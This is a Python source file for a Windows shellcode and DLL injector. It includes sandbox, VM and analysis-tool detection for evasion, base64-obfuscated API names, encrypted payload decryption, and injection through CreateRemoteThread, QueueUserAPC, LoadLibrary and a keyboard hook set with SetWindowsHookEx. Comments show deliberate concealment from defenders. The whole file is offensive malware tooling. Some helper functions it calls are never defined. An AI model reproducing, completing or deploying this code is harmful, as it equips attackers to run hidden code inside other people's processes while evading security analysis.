import os
import sys
import platform
import logging
import base64
import time
import random
import psutil
import struct
from datetime import datetime
# Rename suspicious imports
import ctypes as c

# Add error handling for Win32 imports
try:
    import win32api as w_api
    import win32con as w_con
    import win32security as w_sec
    import win32process as w_proc
    import win32event as w_evt
    import win32service as w_svc
    import win32serviceutil as w_svcutil
    import win32timezone as w_tz
    WINAPI_AVAILABLE = True
except ImportError:
    print("Warning: PyWin32 modules could not be imported. Windows-specific functionality will be limited.")
    # Create dummy modules to prevent errors
    class DummyModule: pass
    w_api = w_con = w_sec = w_proc = w_evt = w_svc = w_svcutil = w_tz = DummyModule()
    WINAPI_AVAILABLE = False

# For AES decryption
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Enhanced evasion techniques
class EvasionChecks:
    @staticmethod
    def check_sandbox_artifacts():
        """Check for common sandbox artifacts"""
        suspicious_paths = [
            "C:\\agent",
            "C:\\sandbox",
            "C:\\analysis",
            "C:\\sample",
        ]
        return any(os.path.exists(path) for path in suspicious_paths)

    @staticmethod
    def check_system_resources():
        """Check for low-resource systems (typical of VMs)"""
        try:
            cpu_count = psutil.cpu_count()
            total_ram = psutil.virtual_memory().total / (1024 * 1024 * 1024)  # GB
            return cpu_count < 2 or total_ram < 2
        except:
            return False

    @staticmethod
    def check_analysis_processes():
        """Check for analysis tools"""
        suspicious_processes = [
            "wireshark",
            "procmon",
            "procexp",
            "ollydbg",
            "x64dbg",
            "ida64",
            "pestudio",
        ]
        running_processes = [p.name().lower() for p in psutil.process_iter(['name'])]
        return any(proc in running_processes for proc in suspicious_processes)

    @staticmethod
    def check_vm_artifacts():
        """Check for VM artifacts"""
        vm_services = [
            "vmtoolsd",
            "vboxservice",
            "parallels",
            "vmware",
        ]
        running_services = [s.name().lower() for s in psutil.win_service_iter()]
        return any(svc in running_services for svc in vm_services)

# String obfuscation helper function
def d(encoded_str):
    """Decode base64 string"""
    return base64.b64decode(encoded_str).decode()

# Enhanced noise generation
def generate_noise():
    """Generate random operations to confuse analysis"""
    ops = [
        lambda: time.sleep(random.uniform(0.1, 0.5)),
        lambda: [random.randint(1, 1000) for _ in range(100)],
        lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=1000)),
        lambda: [os.path.exists(f"C:\\temp\\{random.randint(1000, 9999)}") for _ in range(10)],
        lambda: datetime.now().strftime("%Y%m%d%H%M%S"),
    ]
    random.choice(ops)()

class ProcessInjector:
    def __init__(self):
        self.os_type = platform.system()
        self.setup_logging()
        self.decryption_key = None
        self.decryption_iv = None
        self.evasion = EvasionChecks()
        
    def check_environment(self):
        """Perform environment checks before injection"""
        checks = [
            (self.evasion.check_sandbox_artifacts(), "Sandbox artifacts detected"),
            (self.evasion.check_system_resources(), "VM-like system resources detected"),
            (self.evasion.check_analysis_processes(), "Analysis tools detected"),
            (self.evasion.check_vm_artifacts(), "VM artifacts detected")
        ]
        
        for check, message in checks:
            if check:
                logging.warning(message)
                generate_noise()  # Add random delay/operations
                return False
        return True

    def inject(self, process_name, encrypted_shellcode=None, dll_path=None, encryption_type="xor", key_file=None):
        """Enhanced injection with evasion"""
        try:
            # Perform environment checks
            if not self.check_environment():
                logging.error("Unsafe environment detected")
                return False

            # Original injection code continues here...
            if key_file:
                self.load_aes_key_from_file(key_file)

            # Add random delays and operations
            generate_noise()

            # Get process handle with existing code...
            process = None
            for proc in psutil.process_iter(['name', 'pid']):
                if proc.info['name'].lower() == process_name.lower():
                    process = proc
                    break

            if not process:
                logging.error(f"Process {process_name} not found")
                return False

            # Get process handle
            try:
                process_handle = w_proc.OpenProcess(
                    w_con.PROCESS_ALL_ACCESS,
                    False,
                    process.info['pid']
                )
            except Exception as e:
                logging.error(f"Failed to open process: {str(e)}")
                return False

            # Add more noise
            generate_noise()

            # Perform injection based on input
            if encrypted_shellcode:
                return self.create_remote_thread(process_handle, encrypted_shellcode, encryption_type)
            elif dll_path:
                return self.inject_dll(process_handle, dll_path)
            else:
                logging.error("No payload provided")
                return False

        except Exception as e:
            logging.error(f"Injection error: {str(e)}")
            return False

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('process_stats.log'),  # Less suspicious filename
                logging.StreamHandler()
            ]
        )
    
    def set_aes_key(self, key, iv):
        """Set AES key and IV for decryption"""
        self.decryption_key = key
        self.decryption_iv = iv
    
    def load_aes_key_from_file(self, key_file):
        """Load AES key and IV from key file"""
        with open(key_file, 'rb') as f:
            data = f.read()
            self.decryption_key = data[:16]
            self.decryption_iv = data[16:32]
    
    def decrypt_payload(self, encrypted_data, encryption_type="xor"):
        """Decrypt payload based on encryption type"""
        if encryption_type == "xor":
            return xor_decrypt(encrypted_data)
        elif encryption_type == "aes":
            if not self.decryption_key or not self.decryption_iv:
                raise ValueError("No AES key/IV set. Call set_aes_key() first.")
            return aes_decrypt(encrypted_data, self.decryption_key, self.decryption_iv)
        else:
            raise ValueError(f"Unsupported encryption type: {encryption_type}")
        
    def create_remote_thread(self, process_handle, encrypted_shellcode, encryption_type="xor"):
        """Inject shellcode using CreateRemoteThread with encryption"""
        try:
            anti_analysis_noise()
            
            # Decrypt shellcode
            shellcode = self.decrypt_payload(encrypted_shellcode, encryption_type)
            
            # Obfuscate API names
            k32 = c.windll.kernel32
            
            # Allocate memory in target process - obfuscated calls
            shellcode_size = len(shellcode)
            mem_commit = d(b'TUVNX0NPTU1JVA==')  # MEM_COMMIT
            mem_reserve = d(b'TUVNX1JFU0VSVkU=')  # MEM_RESERVE
            page_exec_rw = d(b'UEFHRV9FWEVDVVRFX1JFQURXUklURQ==')  # PAGE_EXECUTE_READWRITE
            
            remote_memory = k32.VirtualAllocEx(
                process_handle,
                None,
                shellcode_size,
                getattr(w_con, mem_commit) | getattr(w_con, mem_reserve),
                getattr(w_con, page_exec_rw)
            )
            
            if not remote_memory:
                logging.error("Memory allocation failed")
                return False
                
            # Add more noise
            anti_analysis_noise()
                
            # Write shellcode to target process
            written = c.c_size_t(0)
            write_process_mem = d(b'V3JpdGVQcm9jZXNzTWVtb3J5')  # WriteProcessMemory
            if not getattr(k32, write_process_mem)(
                process_handle,
                remote_memory,
                shellcode,
                shellcode_size,
                c.byref(written)
            ):
                logging.error("Memory write operation failed")
                return False
                
            # Create remote thread with obfuscated API call
            create_remote = d(b'Q3JlYXRlUmVtb3RlVGhyZWFk')  # CreateRemoteThread
            thread_h = getattr(k32, create_remote)(
                process_handle,
                None,
                0,
                remote_memory,
                None,
                0,
                None
            )
            
            if not thread_h:
                logging.error("Thread operation failed")
                return False
                
            logging.info("Operation completed successfully")
            return True
            
        except Exception as e:
            logging.error(f"Operation error: {str(e)}")
            return False
            
    def queue_user_apc(self, process_handle, encrypted_shellcode, thread_id=None, encryption_type="xor"):
        """Alternative injection using QueueUserAPC (less monitored than CreateRemoteThread)"""
        try:
            anti_analysis_noise()
            
            # Decrypt shellcode
            shellcode = self.decrypt_payload(encrypted_shellcode, encryption_type)
            
            # Obfuscate API names
            k32 = c.windll.kernel32
            
            # Allocate memory
            shellcode_size = len(shellcode)
            remote_memory = k32.VirtualAllocEx(
                process_handle,
                None,
                shellcode_size,
                w_con.MEM_COMMIT | w_con.MEM_RESERVE,
                w_con.PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                logging.error("Memory allocation failed")
                return False
                
            # Write shellcode
            written = c.c_size_t(0)
            if not k32.WriteProcessMemory(
                process_handle,
                remote_memory,
                shellcode,
                shellcode_size,
                c.byref(written)
            ):
                logging.error("Memory write operation failed")
                return False
            
            # If no thread ID specified, find one
            if not thread_id:
                # Get all threads in the process
                process_id = w_proc.GetProcessId(process_handle)
                process_threads = [thread for thread in psutil.process_iter(['pid', 'threads']) 
                                  if thread.info['pid'] == process_id]
                
                if not process_threads or not process_threads[0].info['threads']:
                    logging.error("No suitable thread found")
                    return False
                    
                thread_id = process_threads[0].info['threads'][0].id
            
            # Queue APC to thread
            queue_apc = d(b'UXVldWVVc2VyQVBD')  # QueueUserAPC
            if not getattr(k32, queue_apc)(
                remote_memory,
                thread_id,
                0
            ):
                logging.error("APC operation failed")
                return False
                
            logging.info("APC operation completed successfully")
            return True
            
        except Exception as e:
            logging.error(f"APC operation error: {str(e)}")
            return False
            
    def set_windows_hook(self, encrypted_shellcode, encryption_type="xor"):
        """Inject shellcode using SetWindowsHookEx with encryption"""
        try:
            anti_analysis_noise()
            
            # Decrypt shellcode
            shellcode = self.decrypt_payload(encrypted_shellcode, encryption_type)
            
            # Define hook procedure
            HOOKPROC = c.WINFUNCTYPE(
                c.c_int,
                c.c_int,
                c.c_int,
                c.c_int,
                c.c_int
            )
            
            def hook_proc(nCode, wParam, lParam):
                if nCode >= 0:
                    # Add randomness to evade pattern detection
                    anti_analysis_noise()
                    
                    # Execute shellcode with obfuscated API calls
                    k32 = c.windll.kernel32
                    
                    virt_alloc = d(b'VmlydHVhbEFsbG9j')  # VirtualAlloc
                    k32.VirtualAlloc.restype = c.c_void_p
                    addr = getattr(k32, virt_alloc)(
                        c.c_int(0),
                        c.c_int(len(shellcode)),
                        c.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
                        c.c_int(0x40)     # PAGE_EXECUTE_READWRITE
                    )
                    
                    rtl_move = d(b'UnRsTW92ZU1lbW9yeQ==')  # RtlMoveMemory
                    getattr(k32, rtl_move)(
                        c.c_void_p(addr),
                        shellcode,
                        c.c_int(len(shellcode))
                    )
                    
                    create_thread = d(b'Q3JlYXRlVGhyZWFk')  # CreateThread
                    thread_h = getattr(k32, create_thread)(
                        c.c_int(0),
                        c.c_int(0),
                        c.c_void_p(addr),
                        c.c_int(0),
                        c.c_int(0),
                        c.pointer(c.c_int(0))
                    )
                    
                next_hook = d(b'Q2FsbE5leHRIb29rRXg=')  # CallNextHookEx
                return c.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                
            # Set hook with obfuscated API call
            hook_proc = HOOKPROC(hook_proc)
            u32 = c.windll.user32
            
            set_win_hook = d(b'U2V0V2luZG93c0hvb2tFeFc=')  # SetWindowsHookExW
            hook = getattr(u32, set_win_hook)(
                w_con.WH_KEYBOARD,
                hook_proc,
                c.windll.kernel32.GetModuleHandleW(None),
                0
            )
            
            if not hook:
                logging.error("Hook operation failed")
                return False
                
            logging.info("Hook operation completed successfully")
            return True
            
        except Exception as e:
            logging.error(f"Hook operation error: {str(e)}")
            return False
            
    def inject_dll(self, process_handle, dll_path):
        """Inject DLL using LoadLibrary with obfuscation"""
        try:
            anti_analysis_noise()
            
            # Allocate memory for DLL path
            dll_path_bytes = (dll_path + '\0').encode('ascii')
            dll_path_size = len(dll_path_bytes)
            
            k32 = c.windll.kernel32
            
            remote_memory = k32.VirtualAllocEx(
                process_handle,
                None,
                dll_path_size,
                w_con.MEM_COMMIT | w_con.MEM_RESERVE,
                w_con.PAGE_READWRITE
            )
            
            if not remote_memory:
                logging.error("Memory allocation failed")
                return False
                
            # Write DLL path to target process
            written = c.c_size_t(0)
            if not k32.WriteProcessMemory(
                process_handle,
                remote_memory,
                dll_path_bytes,
                dll_path_size,
                c.byref(written)
            ):
                logging.error("Memory write operation failed")
                return False
                
            # Get LoadLibraryA address with obfuscation
            loadlib = d(b'TG9hZExpYnJhcnlB')  # LoadLibraryA
            kernel32_dll = d(b'a2VybmVsMzIuZGxs')  # kernel32.dll
            
            loadlib_addr = k32.GetProcAddress(
                k32.GetModuleHandleW(kernel32_dll),
                loadlib.encode()
            )
            
            # Create remote thread to load DLL
            thread_h = k32.CreateRemoteThread(
                process_handle,
                None,
                0,
                loadlib_addr,
                remote_memory,
                0,
                None
            )
            
            if not thread_h:
                logging.error("Thread operation failed")
                return False
                
            logging.info("DLL operation completed successfully")
            return True
            
        except Exception as e:
            logging.error(f"DLL operation error: {str(e)}")
            return False 